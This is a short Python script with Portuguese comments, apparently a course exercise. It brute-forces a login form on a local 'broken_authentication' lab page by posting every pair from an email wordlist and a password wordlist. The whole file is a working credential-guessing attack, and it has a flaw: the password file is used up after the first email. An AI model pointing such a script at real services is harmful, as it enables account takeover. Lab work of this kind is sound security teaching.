import requests

url = 'http://127.0.0.1/unihacker/curso/broken_authentication.php'

# wordlists
emails = open('emails.txt')
senhas = open('senhas.txt')

# percorre os e-mails
for email in emails.readlines():
    # prercorre as senhas
    for senha in senhas.readlines():
        # parâmetros do formulário
        inputs = {'email': email.rstrip(), 'senha': senha.rstrip()}
        # requisição post
        requisicao = requests.post(url, data = inputs)
        # busca no HTML retornado uma referência à tentativa de login
        if 'Login efetuado com sucesso' in requisicao.text:
            print("\nE-mail:" + str(email) + "Senha:" + str(senha) + "Válido")
        else:
            print("\nE-mail:" + str(email) + "Senha:" + str(senha) + "Inválido")
				

 